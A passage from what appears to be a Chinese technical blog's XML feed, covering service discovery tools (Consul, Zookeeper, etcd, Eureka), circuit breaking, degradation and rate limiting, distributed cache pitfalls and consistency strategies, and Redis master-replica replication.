<li>Client：请求发起方，Server和Client之间可以通过长连接的方式进行交互。如发起注册或者请求集群信息等。</li>
</ul>
<h2 id="Etcd"><a href="#Etcd" class="headerlink" title="Etcd"></a>Etcd</h2><p><a href="https://github.com/coreos/etcd" target="_blank" rel="noopener">etcd</a>是一个采用HTTP协议的健/值对存储系统，它是一个分布式和功能层次配置系统，可用于构建服务发现系统。其很容易部署、安装和使用，提供了可靠的数据持久化特性。它是安全的并且文档也十分齐全。</p>
<p>它的架构如下图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-etcd.png" alt="Etcd的架构"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table>
<thead>
<tr>
<th align="left">Feature</th>
<th align="left">Consul</th>
<th align="left">zookeeper</th>
<th align="left">etcd</th>
<th align="left">euerka</th>
</tr>
</thead>
<tbody><tr>
<td align="left">服务健康检查</td>
<td align="left">服务状态，内存，硬盘等</td>
<td align="left">(弱)长连接，keepalive</td>
<td align="left">连接心跳</td>
<td align="left">可配支持</td>
</tr>
<tr>
<td align="left">多数据中心</td>
<td align="left">支持</td>
<td align="left">—</td>
<td align="left">—</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">kv存储服务</td>
<td align="left">支持</td>
<td align="left">支持</td>
<td align="left">支持</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">一致性</td>
<td align="left">raft</td>
<td align="left">paxos</td>
<td align="left">raft</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">cap</td>
<td align="left">ca</td>
<td align="left">cp</td>
<td align="left">cp</td>
<td align="left">ap</td>
</tr>
<tr>
<td align="left">使用接口(多语言能力)</td>
<td align="left">支持http和dns</td>
<td align="left">客户端</td>
<td align="left">http/grpc</td>
<td align="left">http（sidecar）</td>
</tr>
<tr>
<td align="left">watch支持</td>
<td align="left">全量/支持long polling</td>
<td align="left">支持</td>
<td align="left">支持 long polling</td>
<td align="left">支持 long polling/大部分增量</td>
</tr>
<tr>
<td align="left">自身监控</td>
<td align="left">metrics</td>
<td align="left">—</td>
<td align="left">metrics</td>
<td align="left">metrics</td>
</tr>
<tr>
<td align="left">安全</td>
<td align="left">acl /https</td>
<td align="left">acl</td>
<td align="left">https支持（弱）</td>
<td align="left">—</td>
</tr>
<tr>
<td align="left">spring cloud集成</td>
<td align="left">已支持</td>
<td align="left">已支持</td>
<td align="left">已支持</td>
<td align="left">已支持</td>
</tr>
</tbody></table>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://thesecretlivesofdata.com/raft/" target="_blank" rel="noopener">RAFT协议动图演示</a></p>
<p><a href="https://blog.csdn.net/peterwanghao/article/details/84835631" target="_blank" rel="noopener">服务发现的基本原理与比较：Eureka vs Consul vs Zookeeper</a></p>
<p><a href="https://www.jianshu.com/p/3bd041807974" target="_blank" rel="noopener">ETCD 与 服务发现</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>RAFT</tag>
        <tag>服务发现</tag>
        <tag>Consul</tag>
        <tag>Eureka</tag>
        <tag>Etcd</tag>
        <tag>Zookeeper</tag>
        <tag>paxos</tag>
        <tag>Gossip</tag>
      </tags>
  </entry>
  <entry>
    <title>熔断、降级和限流之间的区别</title>
    <url>/2020/04/14/SpringCloud/2020-04-14-005-%E7%86%94%E6%96%AD%E3%80%81%E9%99%90%E6%B5%81%E5%92%8C%E9%99%8D%E7%BA%A7%E4%B9%8B%E5%89%8D%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="熔断、降级和限流之间的区别"><a href="#熔断、降级和限流之间的区别" class="headerlink" title="熔断、降级和限流之间的区别"></a>熔断、降级和限流之间的区别</h1><p>当我们的系统整体访问量突然剧增，大量的请求在瞬间涌入，或者某个下游服务突然异常，大量请求调用阻塞又或者在可预见的将来，几天内比如，会有一波流量的高峰（比如双十一）。这个时候，我们要怎么做才能保证系统正常提供功能，或者说，最低要求，如何保证系统核心业务能正常提供功能？</p>
<p>这种情况下，在无法提升服务的负载能力的时候，我们可以采取三种措施：熔断、降级或限流。</p>
<h2 id="熔断"><a href="#熔断" class="headerlink" title="熔断"></a>熔断</h2><p>当我们的下游服务因为某些原因出现故障，导致调用超时或者失败时，我们这时候就不应该继续不断重试加重下游服务的问题，而是应该及时失败。</p>
<p>熔断模式可以防止应用程序不断地尝试可能超时和失败的服务，能达到应用程序执行而不必等待下游服务修正错误服务。</p>
<p>并且熔断器模式还能让应用程序自我诊断下游系统的错误是否已经修正，如果没有，不放量去请求，如果请求成功了，慢慢的增加请求，再次尝试调用。</p>
<p><img src="https://huhansi.github.io/images/2020-04-11-rongduan.png" alt="熔断模式"></p>
<h3 id="熔断怎么做"><a href="#熔断怎么做" class="headerlink" title="熔断怎么做"></a>熔断怎么做</h3><p>首先，需秉持的一个中心思想是：量力而行。因为软件和人不同，没有奇迹会发生，什么样的性能撑多少流量是固定的。这是根本。</p>
<p>然后，这四步走分别是：</p>
<ol>
<li>定义一个识别是否处于“不可用”状态的策略</li>
<li>切断联系</li>
<li>定义一个识别是否处于“可用”状态的策略，并尝试探测</li>
<li>重新恢复正常</li>
</ol>
<h2 id="降级"><a href="#降级" class="headerlink" title="降级"></a>降级</h2><p>降级的目的用一句话概括就是：<strong>将有限的资源效益最大化</strong>。当我们的服务器压力剧增为了<strong>保证核心功能的可用性</strong> ，而<strong>选择性的降低一些功能的可用性，或者直接关闭该功能</strong>。这就是典型的<strong>丢车保帅</strong>了。</p>
<h3 id="牺牲用户体验"><a href="#牺牲用户体验" class="headerlink" title="牺牲用户体验"></a>牺牲用户体验</h3><ul>
<li>为了减少对「冷数据」的获取，禁用列表的翻页功能。</li>
<li>为了放缓流量进入的速率，增加验证码机制。</li>
<li>为了减少“大查询”浪费过多的资源，提高筛选条件要求（禁用模糊查询、部分条件必选等）。</li>
<li>用通用的静态化数据代替「千人千面」的动态数据。</li>
<li>甚至更简单粗暴的，直接挂一个页面显示「XX功能在XX时间内暂时关闭」。</li>
</ul>
<p>此类方案虽然或多或少降低了用户的体验，但是<strong>在某些时期，有些功能并不是「刚需」</strong>。以此换取对系统的保护是笔划算的买卖。</p>
<h3 id="牺牲功能完整性"><a href="#牺牲功能完整性" class="headerlink" title="牺牲功能完整性"></a>牺牲功能完整性</h3><ul>
<li><p>比如通过临时关闭「风控」、取消部分「条件是否满足」的判断（如，将积分商品添加到购物车时判断积分够不够）等操作，减少这类「验证」动作以释放更多的资源。</p>
</li>
<li><p>又或者将原本info、warning级别的日志采集关闭或者直接不采集，仅采集error以及fault级别的日志。</p>
</li>
</ul>
<h3 id="牺牲时效性"><a href="#牺牲时效性" class="headerlink" title="牺牲时效性"></a>牺牲时效性</h3><ul>
<li><p>比如原先在商品页会显示当前还剩多少个库存，现在可以调整成固定显示「有货」。</p>
</li>
<li><p>以及将一些原本就是异步进行的操作，处理效率放缓，甚至暂缓一段时间。如，送积分、送券等等。</p>
</li>
</ul>
<h3 id="降级怎么做"><a href="#降级怎么做" class="headerlink" title="降级怎么做"></a>降级怎么做</h3><h4 id="定级定序"><a href="#定级定序" class="headerlink" title="定级定序"></a>定级定序</h4><p>把不同的服务按照功能是否核心，定义不同的级别，相同级别的服务，再定义它们的顺序。总之，越重要的服务越后面降级。</p>
<p>有一点是需要格外注意的：<strong>某个程序所依赖的下游程序的级别不能低于该程序的级别</strong>。</p>
<h2 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h2><p>限流的作用就是提供完成的系统功能，但是会限制进出系统的流量。</p>
<p>限流一般分三步：获取系统的能力上限、指定限流的策略；处理被限制的流量</p>
<h3 id="获取系统的能力上限"><a href="#获取系统的能力上限" class="headerlink" title="获取系统的能力上限"></a>获取系统的能力上限</h3><p>压测</p>
<h3 id="指定限流的策略"><a href="#指定限流的策略" class="headerlink" title="指定限流的策略"></a>指定限流的策略</h3><p>计算某段时间内的总请求量或者总请求量。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/50351042" target="_blank" rel="noopener">分布式系统关注点——99%的人都能看懂的「熔断」以及最佳实践</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/51681984" target="_blank" rel="noopener">分布式系统关注点——想通关「限流」？只要这一篇</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/52455918" target="_blank" rel="noopener">让你的系统“坚挺不倒”的最后一个大招——「降级」</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>熔断</tag>
        <tag>降级</tag>
        <tag>限流</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式缓存常见的几种问题</title>
    <url>/2020/04/14/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8D%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="分布式缓存常见的几种问题"><a href="#分布式缓存常见的几种问题" class="headerlink" title="分布式缓存常见的几种问题"></a>分布式缓存常见的几种问题</h1><p>为什么使用分布式缓存和分布式缓存的应用场景就先不说了。我们着重看看，分布式缓存的若干问题</p>
<h2 id="缓存选型"><a href="#缓存选型" class="headerlink" title="缓存选型"></a>缓存选型</h2><p>当前主流的做缓存的开源组件有Memcache和Redis，它们各有千秋，那么到底怎么选择呢？我们一项一项比较看看。</p>
<table>
<thead>
<tr>
<th></th>
<th>Memcache</th>
<th>Redis</th>
</tr>
</thead>
<tbody><tr>
<td>数据类型</td>
<td>只支持简单的数据类型</td>
<td>支持K/V之外，还有list、set、zset、hash等数据结构</td>
</tr>
<tr>
<td>持久化</td>
<td>不支持持久化</td>
<td>支持AOF和RDB</td>
</tr>
<tr>
<td>键大小</td>
<td>键长最大为250个字符</td>
<td>最大支持512M</td>
</tr>
<tr>
<td>值大小</td>
<td>值不能超过1MB，但是可以修改配置以支持更大的value</td>
<td>最大支持512M</td>
</tr>
<tr>
<td>线程模型</td>
<td>多线程模型</td>
<td>单线程模型</td>
</tr>
<tr>
<td>内存管理</td>
<td>使用Slab Allocation。原理相当简单，预先分配一系列大小固定的组，然后根据数据大小选择最合适的块存储。避免了内存碎片。</td>
<td>Redis通过定义一个数组来记录所有的内存分配情况， Redis采用的是包装的malloc/free。由于malloc 首先以链表的方式搜索已管理的内存中可用的空间分配，导致内存碎片比较多。</td>
</tr>
<tr>
<td>集群部署</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>分布式</td>
<td>使用Magent在客户端进行一致性hash做分布式</td>
<td>Redis支持在服务器端做分布式（PS:Twemproxy/Codis/Redis-cluster多种分布式实现方式）</td>
</tr>
</tbody></table>
<h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><p>缓存穿透指的是，每次查询数据，发现查询不到，然后又去数据库查询，数据库也没。第二次同样数据过来查询，还是走缓存，再走数据库，查询两次。</p>
<p>这种情况一般可以用以下方式解决。</p>
<h3 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h3><p>一个很长的二进制向量和一系列随机映射函数组成，将确定不存在的数据构建到过滤器中，用它来过滤请求。</p>
<h3 id="缓存空对象"><a href="#缓存空对象" class="headerlink" title="缓存空对象"></a>缓存空对象</h3><p>就算数据库里查询出来的是个null对象，也把它丢到缓存里，下来再来的时候就不用再去数据库里面查了。</p>
<h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><p>缓存雪崩指的是在某个时刻，大批量缓存同时失效，导致所有的查询全部被倒流到数据库，给数据库和内存造成巨大的压力，甚至造成数据库宕机。</p>
<p>它也有几种解决办法</p>
<h3 id="加锁排队"><a href="#加锁排队" class="headerlink" title="加锁排队"></a>加锁排队</h3><p>通过加锁或者排队机制来限制读数据库写缓存的线程数量</p>
<h3 id="缓存时间增加随机值"><a href="#缓存时间增加随机值" class="headerlink" title="缓存时间增加随机值"></a>缓存时间增加随机值</h3><p>避免多个缓存key在同一时间失效，导致压力更加集中。</p>
<h2 id="缓存预热"><a href="#缓存预热" class="headerlink" title="缓存预热"></a>缓存预热</h2><p>缓存预热就是系统上线后，将相关的缓存数据直接加载到缓存系统。</p>
<h2 id="缓存无底洞"><a href="#缓存无底洞" class="headerlink" title="缓存无底洞"></a>缓存无底洞</h2><p>键值数据库由于通常采用哈希函数将key映射到各个节点上，造成key的分布与业务无关，但是由于数据量和访问量的持续增长，造成需要添加大量节点做水平扩容，导致键值分布到更多的节点上，所以无论是Memcache还是Redis的分布式，批量操作通常需要从不同节点上获取，相对于单机批量操作只涉及一次网络操作，分布式批量操作会涉及多次网络时间。</p>
<ul>
<li>客户端一次批量操作会涉及多次网络操作，也就意味着批量操作会随着节点的增多，耗时会不断增大。</li>
<li>网络连接数变多，对节点的性能也有一定影响。</li>
</ul>
<p>有几种解决方案：</p>
<h3 id="串行命令"><a href="#串行命令" class="headerlink" title="串行命令"></a>串行命令</h3><p>逐次执行n个get命令</p>
<h3 id="串行IO"><a href="#串行IO" class="headerlink" title="串行IO"></a>串行IO</h3><p>Redis Cluster使用CRC16算法计算出散列值，再取对16383的余数就可以算出slot值，同时Smart客户端会保存slot和节点的对应关系，有了这两个数据就可以将属于同一个节点的key进行归档，得到每个节点的key子列表，之后对每个节点执行mget或者Pipeline操作</p>
<h3 id="并行IO"><a href="#并行IO" class="headerlink" title="并行IO"></a>并行IO</h3><p>将串行IO中的串行操作改为并行操作</p>
<h3 id="hash-tag实现"><a href="#hash-tag实现" class="headerlink" title="hash_tag实现"></a>hash_tag实现</h3><p>Redis Cluster的hash_tag功能，他可以将多个key强制分配到一个节点上</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table>
<thead>
<tr>
<th align="left">方案</th>
<th align="left">优点</th>
<th align="left">缺点</th>
<th align="left">网络IO</th>
</tr>
</thead>
<tbody><tr>
<td align="left">串行命令</td>
<td align="left">编程简单如果少量keys，性能可以满足要求</td>
<td align="left">大量keys请求延迟严重</td>
<td align="left"><em>O(keys)</em></td>
</tr>
<tr>
<td align="left">串行IO</td>
<td align="left">编程简单少量节点，性能满足要求</td>
<td align="left">大量node延迟严重</td>
<td align="left"><em>O(nodes)</em></td>
</tr>
<tr>
<td align="left">并行IO</td>
<td align="left">利用并行特性，延迟取决于最慢的节点</td>
<td align="left">编程复杂由于多线程，问题定位可能较难</td>
<td align="left"><em>O(max_slow(nodes))</em></td>
</tr>
<tr>
<td align="left">hash_tag</td>
<td align="left">性能最高</td>
<td align="left">业务维护成本较高容易出现数据倾斜</td>
<td align="left"><em>O(1)</em></td>
</tr>
</tbody></table>
<h2 id="分布式缓存的一致性"><a href="#分布式缓存的一致性" class="headerlink" title="分布式缓存的一致性"></a>分布式缓存的一致性</h2><p>在读取的情况下，先读取缓存，如果缓存有数据，直接返回，没有的话，从数据库读取数据，然后设置到缓存中，返回数据。这种情况下，数据是可以保持一致性的。但是在更新或者删除的时候呢？怎样确保新数据更新至数据库之后，不会读取到缓存里的旧数据呢？</p>
<p>下面我们看下常见的几种策略。</p>
<h3 id="先更新缓存，再更新数据库"><a href="#先更新缓存，再更新数据库" class="headerlink" title="先更新缓存，再更新数据库"></a>先更新缓存，再更新数据库</h3><p>这种场景会有问题，如果更新缓存成功了，更新数据库失败了。并且缓存没有做持久化，在更新完之后就挂了，那么数据就永远地丢失了。</p>
<h3 id="先删除缓存，再更新数据库"><a href="#先删除缓存，再更新数据库" class="headerlink" title="先删除缓存，再更新数据库"></a>先删除缓存，再更新数据库</h3><p>这里就是把上面的更新操作换成删除操作。删除操作在并发情况下会有问题。假设两个线程A和B，线程A刚删除完缓存的时候，线程B正巧来查询，这时候B发现缓存里面没有数据，于是去数据库里查询，然后更新到缓存中，之后A又把最新的数据更新到数据库里。这个时候，缓存中的数据时更新前的老数据，数据库里面是最新的数据。数据就脏了，并且会一直保持下去。</p>
<h3 id="先更新数据库，再更新缓存"><a href="#先更新数据库，再更新缓存" class="headerlink" title="先更新数据库，再更新缓存"></a>先更新数据库，再更新缓存</h3><p>这个场景下会有ABBA问题，线程A和B先后更新一个值，A改为1，B改为2.系统要求值最后值为2</p>
<p>因为线程调度的不确定性和网络等原因，存在下面这种时序：</p>
<ol>
<li>A更新了数据库，值设置为1</li>
<li>B更新了数据库，值设置为2</li>
<li>B更新了缓存，值设置为2</li>
<li>A更新了缓存，值设置为1</li>
</ol>
<p>此时就产生了脏数据</p>
<h3 id="先更新数据库，再删除缓存"><a href="#先更新数据库，再删除缓存" class="headerlink" title="先更新数据库，再删除缓存"></a>先更新数据库，再删除缓存</h3><p>这种情况也会存在并发问题。线程A和B，线程A做更新操作，线程B做查询操作。</p>
<ol>
<li>缓存刚好失效</li>
<li>线程B查询数据库，获取一个旧值</li>
<li>线程A将新值写入数据库</li>
<li>线程A删除缓存</li>
<li>线程B将查询的旧值写入缓存</li>
</ol>
<p>这种情况下就会产生脏数据。但是概率极低。因为，要在步骤3耗费的时间小于步骤2的情况下，步骤4才有可能比步骤5先发生。但数据库肯定是读操作远远快于写操作的，所以这一情形很难出现。</p>
<p>如果非要解决这个问题的话，采用下文说的延时双删策略。</p>
<h3 id="先删除缓存，再更新数据库-1"><a href="#先删除缓存，再更新数据库-1" class="headerlink" title="先删除缓存，再更新数据库"></a>先删除缓存，再更新数据库</h3><p>还是线程A和B，线程A负责写入新值，线程B负责查询。这两个线程同时执行的话，存在下面这种场景：</p>
<ol>
<li>线程A先删除缓存</li>
<li>线程B查询缓存，发现缓存不存在</li>
<li>线程B查询数据库得到旧值</li>
<li>线程B将旧值写入缓存</li>
<li>线程A将新值写入缓存</li>
</ol>
<p>这个时候又出现了脏数据的问题，并且脏数据也有可能长时间存在。</p>
<h4 id="延时双删"><a href="#延时双删" class="headerlink" title="延时双删"></a>延时双删</h4><p>这个时候可以采用延时双删策略，以达到最终一致性的目的。</p>
<p>意思就是，先删除缓存，在更新数据库，隔特定时间，再删除缓存一次。就是在上文的场景中把步骤5改为，等待1S（举例，实际时间需更具业务确定，但不能太短，防止线程B还没写入就已经开始删数据），再次删除缓存。</p>
<p>这种策略下，如果数据库做了读写分离，还会存在问题。睡眠时间就得加上主从同步的延时时间。</p>
<p>等待的这个时间也可以改为异步线程执行，以免减低系统的吞吐量。</p>
<p>第二次删除也存在删除缓存失败的可能，这个时候可以借助消息队列做重试，直到成功为止。</p>
<p>其实延时双删也只是个最终一致性策略，更新完数据库第二次删除的那段时间，数据还是不一致的。</p>
<h3 id="延时双删的补偿策略"><a href="#延时双删的补偿策略" class="headerlink" title="延时双删的补偿策略"></a>延时双删的补偿策略</h3><p>本章节所讲的策略，可以说是延时双删的补偿策略，确保数据最后一致行的机制。</p>
<h5 id="策略1："><a href="#策略1：" class="headerlink" title="策略1："></a>策略1：</h5><p>采用消息队列</p>
<p><img src="https://huhansi.github.io/images/2020-04-15-cache1.png" alt="采用消息队列补偿"></p>
<ol>
<li>更新数据库数据； </li>
<li>缓存因为种种问题删除失败 </li>
<li>将需要删除的key发送至消息队列</li>
<li>自己消费消息，获得需要删除的key </li>
<li>继续重试删除操作，直到成功</li>
</ol>
<h5 id="策略2："><a href="#策略2：" class="headerlink" title="策略2："></a>策略2：</h5><p>策略1的缺陷在于对业务代码的大量侵入，为此，有人提出了订阅数据库的binlog的方案</p>
<p>启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作。</p>
<p><img src="https://huhansi.github.io/images/2020-04-15-cache2.jpeg" alt="订阅数据库binlog补偿"></p>
<ol>
<li>更新数据库数据 </li>
<li>数据库会将操作信息写入binlog日志当中</li>
<li>订阅程序提取出所需要的数据以及key </li>
<li>另起一段非业务代码，获得该信息 </li>
<li>尝试删除缓存操作，发现删除失败 </li>
<li>将这些信息发送至消息队列 </li>
<li>重新从消息队列中获得该数据，重试操作。</li>
</ol>
<h3 id="read-write-through-缓存代理"><a href="#read-write-through-缓存代理" class="headerlink" title="read/write through 缓存代理"></a>read/write through 缓存代理</h3><p>Read/Write Through套路是把更新数据库（Repository）的操作由缓存自己代理了，所以，对于应用层来说，就简单很多了。<strong>可以理解为，应用认为后端就是一个单一的存储，而存储自己维护自己的Cache。</strong>数据库由缓存代理，缓存未命中时由缓存加载数据库数据然后应用从缓存读，写数据时更新完缓存后同步写数据库。应用只感知缓存而不感知数据库。</p>
<p><img src="https://huhansi.github.io/images/2020-04-15-cache3.jpg" alt="缓存代理"></p>
<h3 id="写回"><a href="#写回" class="headerlink" title="写回"></a>写回</h3><p>这种模式是指在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。</p>
<p><img src="https://huhansi.github.io/images/2020-04-15-cache4.jpg" alt="写回"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/62314107" target="_blank" rel="noopener">分布式系统关注点——「缓存穿透」和「缓存雪崩」到底啥区别？</a></p>
<p><a href="https://blog.csdn.net/en_joker/article/details/90205936" target="_blank" rel="noopener">缓存：无底洞优化。</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1154683" target="_blank" rel="noopener">分布式之数据库和缓存双写一致性方案解析</a></p>
<p><a href="https://database.51cto.com/art/201808/580720.htm" target="_blank" rel="noopener">阿里P8架构师谈：分布式缓存的应用场景、选型比较、问题和挑战</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/86396877" target="_blank" rel="noopener">常见的缓存更新策略剖析</a></p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式缓存</tag>
        <tag>缓存穿透</tag>
        <tag>缓存雪崩</tag>
        <tag>布隆过滤器</tag>
        <tag>缓存预热</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis的几种部署架构</title>
    <url>/2020/04/13/Redis/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E9%83%A8%E7%BD%B2%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<h1 id="Redis的几种部署架构"><a href="#Redis的几种部署架构" class="headerlink" title="Redis的几种部署架构"></a>Redis的几种部署架构</h1><h2 id="单例部署"><a href="#单例部署" class="headerlink" title="单例部署"></a>单例部署</h2><p>Redis单例部署，采用单个Redis节点部署架构，没有备用节点实时同步数据，不提供数据持久化和备份策略，适用于数据可靠性要求不高的纯缓存业务场景。</p>
<p><img src="https://huhansi.github.io/images/2020-04-13-redis1.png" alt="单例部署"></p>
<p>这个方案优点是：</p>
<ul>
<li>架构简单，部署方便；</li>
<li>高性价比：缓存使用时无需备用节点（单实例可用性可以用supervisor或crontab保证），当然为了满足业务的高可用性，也可以牺牲一个备用节点，但同时刻只有一个实例对外提供服务；</li>
<li>高性能</li>
</ul>
<p>缺点是：</p>
<ul>
<li>不保证数据的可靠性；</li>
<li>在缓存使用，进程重启后，数据丢失，即使有备用的节点解决高可用性，但是仍然不能解决缓存预热问题，因此不适用于数据可靠性要求高的业务；</li>
<li>高性能受限于单核CPU的处理能力（Redis是单线程机制），CPU为主要瓶颈，所以适合操作命令简单，排序、计算较少的场景。也可以考虑用Memcached替代。</li>
</ul>
<h2 id="主从部署"><a href="#主从部署" class="headerlink" title="主从部署"></a>主从部署</h2><h3 id="配置主从节点"><a href="#配置主从节点" class="headerlink" title="配置主从节点"></a>配置主从节点</h3><p>在从节点上执行SLAVEOF命令或者设置slaveof选项，然一个服务器是复制另外一个服务器。</p>
<blockquote>
<p>SLAVEOF master_ip master_port</p>
</blockquote>
<h3 id="复制过程"><a href="#复制过程" class="headerlink" title="复制过程"></a>复制过程</h3><ol>
<li>从节点执行slaveof命令</li>
<li>从节点内部的定时任务发现有主节点信息，开始使用Socket连接主节点</li>
<li>连接建立成功后，发送ping命令，希望得到pong命令响应，否则重试</li>
<li>如果主节点设置了权限，那么就需要进行权限验证；如果验证失败，复制终止。</li>
<li>权限验证通过后，进行数据同步，主节点会把所有数据发送给从节点</li>
<li>当主节点把已有的数据副本同步给从节点后，就会把在开始复制到复制完成期间的写命令发送给从节点，保证主从节点数据一致性</li>
</ol>
<h3 id="旧版复制过程（Redis-2-8以前）"><a href="#旧版复制过程（Redis-2-8以前）" class="headerlink" title="旧版复制过程（Redis 2.8以前）"></a>旧版复制过程（Redis 2.8以前）</h3><p>Redis的复制功能分为同步（sync）和命令传播（command propagate）两个操作：</p>
<ul>
<li>同步操作用于将从服务器的数据库状态更新至主服务器当前所处的数据库状态</li>
<li>命令和传播操作则用于在主服务器的状态被修改，导致主从服务器的数据库状态出现不一致时，让主从服务器的数据库重新回到一致状态</li>
</ul>
<h4 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h4><p>当客户端向从服务器发送SLAVEOF命令，要求从服务器复制主服务器时，从服务器首先要执行同步操作，也就是将从服务器的数据库状态更新至主服务器当前所处的数据库状态。</p>
<p>从服务器对主服务器的同步操作需要通过向主服务器发送SYNC命令来完成，以下是SYNC命令的执行步骤：</p>
<ol>
<li>从服务器向主服务器发送SYNC命令</li>
<li>收到SYNC命令的主服务器执行BGSAVE命令，在后台生成一个RDB文件，并使用一个缓冲区记录从现在开始执行的所有写命令</li>
<li>当主服务器的BGSAVE命令执行完毕时，主服务器会将BGSAVE命令生成的RDB文件发送给从服务器，从服务器接收并载入这个RDB文件，将自己的数据库状态更新至主服务器执行BGSAVE命令时的数据库状态</li>
<li>主服务器将记录在缓冲区里面的所有写命令发送给从服务器，从服务器执行这些写命令，将自己的数据库状态更新至主服务器数据库当前所处的状态。</li>
</ol>
<h4 id="命令传播"><a href="#命令传播" class="headerlink" title="命令传播"></a>命令传播</h4><p>为了让主从服务器一直保持一致状态，主服务器需要对从服务器执行命令传播操作：主服务器会将自己执行的写命令，也就是造成主从服务器不一致的那条写命令，发送给从服务器执行，当从服务器执行了相同的写命令之后，主从服务器将再一次回到一直状态。</p>
<h4 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h4><p>这个复制逻辑存在一个比较严重的缺陷。在正常情况下还好，如果从服务器在复制的期间断线了的话，那么在从服务器再次上线的时候，它还是会发送一个SYNC命令，然后又从头开始同步，等同于每次断线后都重新开始一次全量同步。这个操作是不是必要的呢？</p>
<h3 id="新版复制过程（Redis-2-8及以后）"><a href="#新版复制过程（Redis-2-8及以后）" class="headerlink" title="新版复制过程（Redis 2.8及以后）"></a>新版复制过程（Redis 2.8及以后）</h3><p>为了解决旧版复制功能在处理断线重复制时的低效问题，Redis从2.8版本开始，使用PYSNC命令代替SYNC命令来执行复制时的同步操作。</p>
<p>PSYNC命令具有完整同步和部分重同步两种模式：</p>
<ul>
<li>完成冲同步用于处理初次复制的情况：完成重同步的执行步骤和SYNC命令的执行步骤基本一样，它们都是通过让主服务器创建并发送RDB文件，以及向从服务器发送保存在缓冲区里面的写命令来进行同步。</li>
<li>部分冲同步则用户处理断线后重复值情况：当从服务器在断线以后重新连接主服务器时，如果条件允许，主服务器可以将主从服务器连接断开期间执行的写命令发送给从服务器，从服务器只要接受并执行这些命令，就可以将数据库更新至主服务器当前所处的状态。</li>
</ul>
<h4 id="部分重同步的实现"><a href="#部分重同步的实现" class="headerlink" title="部分重同步的实现"></a>部分重同步的实现</h4><p>部分重同步由以下三个部分构成：</p>
<ul>
<li>主服务器的复制偏移量和从服务器的复制偏移量</li>
<li>主服务器的复制积压缓冲区</li>
<li>服务器的运行ID</li>
</ul>
<h5 id="复制偏移量"><a href="#复制偏移量" class="headerlink" title="复制偏移量"></a>复制偏移量</h5><p>执行复制的双方-主服务器和从服务器会分别维护一个复制偏移量：</p>
<ul>
<li>主服务器每次想从服务器传播N个字节的数据时，就将自己的复制偏移量的值加上N</li>
<li>从服务器每次收到主服务器传播来的N个字节的数据时，就将自己的复制偏移量的值加上N</li>
</ul>
<p>通过比对主从服务器的偏移量，可以很容易知道主从服务器是否处于一直状态：</p>
<ul>
<li>如果主从服务器处于一致状态，那么主从服务器两者的偏移量总是相等的</li>
<li>如果主从服务器两者的偏移量并不相等，说明主从服务器并未处于一致状态</li>
</ul>
<h5 id="复制积压缓冲区"><a href="#复制积压缓冲区" class="headerlink" title="复制积压缓冲区"></a>复制积压缓冲区</h5><p>复制积压缓冲区是由主服务器维护的一个固定长度先进先出的队里，默认大小为1MB。</p>
<p>当主服务器进行命令传播史，它不仅会将写命令发送个所有从服务器，还会降写命令入队到复制积压缓冲区里面。因此，主服务器的复制积压缓冲区里面会保存一部分最近传播的写命令，并且复制积压缓冲区回味队列的每个字节记录相应的复制偏移量。</p>
<p>当从服务器重新链上主服务器时，从服务器会通过PSYNC命令将自己的复制偏移量offset发送个主服务器，主服务器会根据这个复制偏移量来决定对从服务器执行何种同步操作：</p>
<ul>
<li>如果offset偏移量之后的数据仍然存在于复制积压缓冲区里面，那么主服务器将对从服务器执行部分重同步操作</li>
<li>如果offset偏移量之后的数据已经不存在与复制积压缓冲区内了，那么主服务器将对从服务器执行完整重同步操作</li>
</ul>
<h5 id="运行ID"><a href="#运行ID" class="headerlink" title="运行ID"></a>运行ID</h5><p>每个Redis服务器，不管是主服务器还是从服务器，都会在启动的时候自动生成一个40个十六进制字符组成的随机ID。</p>
<p>当从服务器对主服务器进行初次复制时，主服务器会将自己的运行ID传送给从服务器，而从服务器则会将这个运行ID保存起来。当从服务器断线并重新链上一个主服务器时，从服务器将向当前连接的主服务器发送之前保存的运行ID：</p>
<ul>
